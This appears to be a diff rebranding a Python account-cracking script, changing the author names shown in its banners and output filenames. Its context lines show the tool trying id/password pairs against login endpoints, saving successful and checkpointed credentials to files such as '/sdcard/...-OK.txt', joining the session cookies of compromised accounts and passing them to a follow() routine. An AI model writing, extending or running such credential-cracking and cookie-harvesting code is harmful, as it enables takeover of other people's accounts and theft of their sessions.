@@ -608,7 +608,7 @@ def crack(idf,pwv):
 
 	fff = '%'
 
-	sys.stdout.write('\r %s[ NAFIUL ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ AWM ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 
 	sys.stdout.flush()
 
@@ -638,7 +638,7 @@ def crack(idf,pwv):
 
 				cp +=1
 
-				print( f'\r\x1b[1;91m [ NAFIUL-CP ] {idf} | {pw}')
+				print( f'\r\x1b[1;91m [ AWM-CP ] {idf} | {pw}')
 
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 
@@ -652,7 +652,7 @@ def crack(idf,pwv):
 
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 
-				print(f'\r\x1b[1;92m [ NAFIUL-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ AWM-OK ] {idf} | {pw}')
 
 				wrt =('%s - %s' % (idf,pw))
 
@@ -684,7 +684,7 @@ def free(idf,pwv):
 
 	fff = '%'
 
-	sys.stdout.write('\r %s[ ASAD  MALIK ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ Mirwais Danishyar ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 
 	sys.stdout.flush()
 
@@ -732,7 +732,7 @@ def free(idf,pwv):
 
 				ok.append(wrt)
 
-				open('/sdcard/ASAD  MALIK-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/Mirwais Danishyar-OK.txt','a').write('%s\n' % wrt)
 
 				follow(ses,coki)
 
